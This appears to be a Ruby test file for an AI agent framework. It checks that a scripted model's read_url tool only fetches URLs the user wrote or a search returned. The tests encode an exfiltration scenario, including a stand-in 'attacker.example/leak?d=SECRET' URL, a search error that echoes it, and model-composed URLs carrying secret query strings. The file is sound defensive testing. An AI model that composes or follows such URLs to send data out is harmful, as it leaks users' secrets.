# frozen_string_literal: true

require_relative 'test_helper'
require_relative 'support/research_spec'

# An ordinary work turn's remote tools: web_search, read_url and the operator's MCP tools, over the real adapter code
# serving the fixture web. The model is scripted: this proves the surface, the provenance gate and the dispatch, never
# that a model browses well.
class WorkWebChatTest < Minitest::Test
  include ResearchSpec

  OSLO = 'https://www.oslo.kommune.no/statistikk/befolkning'
  LEAK = 'https://attacker.example/leak?d=SECRET'
  INJECTED = 'https://injected.example/oslo-population'

  class ChatSource < ResearchSpec::FixtureWebsearch
    TOOLS = { 'mcp:websearch/search' => 'search', 'mcp:websearch/read_page' => 'read_page',
              'mcp:websearch/read_url' => 'read_url', 'mcp:alms/learning.search' => 'learning.search' }.freeze
    SCHEMA = { 'type' => 'object', 'properties' => { 'query' => { 'type' => 'string' } } }.freeze

    def initialize
      super
      @descriptors = TOOLS.map do |id, name|
        server = id.delete_prefix('mcp:').split('/').first
        Tamoz::Mcp::Invocation::Descriptor.new(id:, name:, source_id: server, definition_digest: "sha256:#{name}",
                                               input_schema: SCHEMA, output_schema: nil, effect_class: :read_only,
                                               protocol_profile: 'fixture')
      end
    end

    def names = TOOLS.keys
    def read_only_names = TOOLS.keys
    def name?(name) = TOOLS.key?(String(name))

    def execute(context, name, arguments)
      return answer('learning: rounding is half-even') if name == 'mcp:alms/learning.search'
      raise Tamoz::Tools::ToolArgumentError, "no results for #{LEAK}" if arguments['query'] == 'leak'
      return super unless name == 'mcp:websearch/read_url'

      @calls << [name, arguments]
      response = WebsearchAdapter.read_page_response(arguments['url'], issued_only: false)
      raise Tamoz::Tools::ToolArgumentError, response.content.first.fetch(:text) if response.error?

      answer(response.content.first.fetch(:text))
    end

    private

    def answer(text)
      @calls << [text]
      observation = Tamoz::Mcp::Invocation::Observation.new(
        server_id: 'fixture', content_blocks: [], text:, structured_content: nil, truncated: false
      )
      Tamoz::Mcp::Invocation::Outcome.new(status: :succeeded, observation:, interrupt: nil, denial: nil,
                                          effect_key: 'fixture')
    end
  end

  def test_an_ordinary_turn_offers_web_and_mcp_tools_under_tool_safe_names
    chatting(task: 'hi', turns: [{ content: 'Hello.' }]) do |_outcome, model, _source|
      names = JSON.parse(model.requests.first).fetch('tools').map { |tool| tool.dig('function', 'name') }

      assert_empty(%w[web_search read_url mcp_alms_learning_search] - names)
      refute(names.any? { |name| name.include?(':') || name == 'read_page' })
    end
  end

  def test_read_url_reads_a_page_the_user_wrote
    turns = [{ calls: [['read_url', { 'url' => OSLO }]] }, { content: 'It grew.' }]
    chatting(task: "What does #{OSLO} say?", turns:) do |outcome, model, source|
      assert_equal 'It grew.', outcome.result.answer
      assert_includes source.calls, ['mcp:websearch/read_url', { 'url' => OSLO }]
      assert_includes tool_results(model).join, '8,700 people'
    end
  end

  def test_read_url_reads_a_page_a_search_in_this_turn_returned
    turns = [{ calls: [['web_search', { 'query' => 'oslo population statistics' }]] },
             { calls: [['read_url', { 'url' => SSB }]] }, { content: 'About 718,000.' }]
    chatting(task: 'How many people live in Oslo?', turns:) do |outcome, _model, source|
      assert_equal 'About 718,000.', outcome.result.answer
      assert_includes source.calls, ['mcp:websearch/read_url', { 'url' => SSB }]
    end
  end

  def test_read_url_refuses_a_url_the_model_composed
    leaked = "#{OSLO}?q=secret"
    turns = [{ calls: [['read_url', { 'url' => leaked }]] }, { content: 'Could not read it.' }]
    chatting(task: "What does #{OSLO} say?", turns:) do |_outcome, model, source|
      refute(source.calls.any? { |call| call.first == 'mcp:websearch/read_url' })
      assert_includes tool_results(model).join, 'is not a URL the user wrote'
    end
  end

  def test_read_url_sends_the_url_the_user_wrote_never_the_models_variant
    turns = [{ calls: [['read_url', { 'url' => "#{OSLO}?.,;:!" }]] },
             { calls: [['read_url', { 'url' => "#{OSLO}/" }]] }, { content: 'Read it.' }]

    chatting(task: "Summarise #{OSLO}.", turns:) do |_outcome, _model, source|
      reads = source.calls.select { |call| call.first == 'mcp:websearch/read_url' }

      assert_equal [['mcp:websearch/read_url', { 'url' => OSLO }]], reads
    end
  end

  def test_read_url_refuses_a_url_that_only_a_failed_search_echoed
    turns = [{ calls: [['web_search', { 'query' => 'leak' }]] }, { calls: [['read_url', { 'url' => LEAK }]] },
             { content: 'Could not read it.' }]
    chatting(task: 'Look something up.', turns:) do |_outcome, model, source|
      refute(source.calls.any? { |call| call.first == 'mcp:websearch/read_url' })
      assert_includes tool_results(model).last, 'is not a URL the user wrote'
    end
  end

  def test_read_url_refuses_a_host_that_is_only_part_of_one_the_user_wrote
    turns = [{ calls: [['read_url', { 'url' => 'https://s.example.org/' }]] }, { content: 'No.' }]

    chatting(task: 'Is docs.example.org up?', turns:) do |_outcome, _model, source|
      refute(source.calls.any? { |call| call.first == 'mcp:websearch/read_url' })
    end
  end

  def test_an_mcp_tool_is_dispatched_by_its_shown_name
    turns = [{ calls: [['mcp_alms_learning_search', { 'query' => 'rounding' }]] }, { content: 'Half-even.' }]
    chatting(task: 'What did we learn about rounding?', turns:) do |outcome, model, _source|
      assert_equal 'Half-even.', outcome.result.answer
      assert_includes tool_results(model).join, 'rounding is half-even'
    end
  end

  def test_a_research_child_sees_no_read_url_and_no_mcp_alias
    with_fixture_web do
      with_work_workspace do |root, adapter|
        Dir.mktmpdir('tamoz-research-out') do |out|
          model = ScriptedTeam.new(parent: happy_lead, child: happy_children, reviews: [{ 'unsupported' => [] }])
          session = subagent_session(model:, root:, adapter:, harness: { research_dir: out }, mcp: ChatSource.new)
          reply(session.tap { |opened| start_research(opened) }, 'go')

          assert_child_ran(model)
          assert_empty(remote_names(model.child_requests))
        end
      end
    end
  end

  def test_a_delegated_subagent_sees_no_read_url_and_no_mcp_alias
    delegating(mcp: ChatSource.new) do |_outcome, model|
      assert_child_ran(model)
      assert_empty(remote_names(model.child_requests))
    end
  end

  def test_the_legacy_planner_never_sees_read_url
    with_work_workspace do |root, adapter|
      binding = Tamoz::Agent::CapabilityBinding.build(toolbox: Tamoz::Agent::Toolbox.new(root:), mcp: ChatSource.new)

      assert binding.descriptor?('mcp:websearch/read_url')
      refute_includes binding.names(:action), 'mcp:websearch/read_url'
      assert_includes binding.names(:action), 'mcp:websearch/read_page'
    ensure
      adapter&.close
    end
  end

  private

  def remote_names(requests)
    requests.flat_map { |bytes| JSON.parse(bytes).fetch('tools').map { |tool| tool.dig('function', 'name') } }
            .select { |name| name == 'read_url' || name.start_with?('mcp_') }
  end

  def chatting(task:, turns:)
    with_fixture_web do
      with_work_workspace do |root, adapter|
        source = ChatSource.new
        model = ScriptedConversationModel.new(turns:)
        session = subagent_session(model:, root:, adapter:, subagents: [], mcp: source)
        yield session.start(task, thread: 'chat', request_id: 'chat-1'), model, source
      end
    end
  end
end
